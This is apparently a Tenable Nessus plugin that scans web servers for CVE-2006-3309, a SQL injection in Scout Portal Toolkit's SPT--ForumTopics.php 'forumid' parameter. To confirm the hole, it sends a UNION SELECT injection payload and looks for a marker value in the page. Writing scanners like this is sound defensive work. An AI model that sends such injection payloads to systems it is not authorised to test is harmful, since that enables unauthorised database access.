#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21764);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-3309");
  script_bugtraq_id(18688);
  script_xref(name:"OSVDB", value:"26870");

  script_name(english:"Scout Portal Toolkit SPT--ForumTopics.php forumid Parameter SQL Injection");
  script_summary(english:"Checks for forumid parameter SQL injection in Scount Portal Toolkit");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Scout Portal Toolkit, an open-source
toolkit for organizing collections of online resources / knowledge. 

The version of Scout Portal Toolkit installed on the remote host fails
to sanitize user-supplied input to the 'forumid' parameter to the
'SPT--ForumTopics.php' script before using it in a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
attacker can exploit this flaw to manipulate database queries, which
may lead to disclosure of sensitive information, modification of data,
or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/1957" );
 script_set_attribute(attribute:"see_also", value:"http://scout.wisc.edu/pipermail/spt-cwis-users/2006-June/001581.html" );
 script_set_attribute(attribute:"solution", value:
"Apply the security patch in the project's mailing list posting
referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


magic = unixtime();
exploit = string(" UNION SELECT null,null,null,", magic, ",4,5");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/spt", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  req = http_get(
    item:string(
      dir, "/SPT--ForumTopics.php?",
      "forumid=-9", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if we see our magic as a topic count.
  if (string("<!--<h3>Topics: ", magic) >< res) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
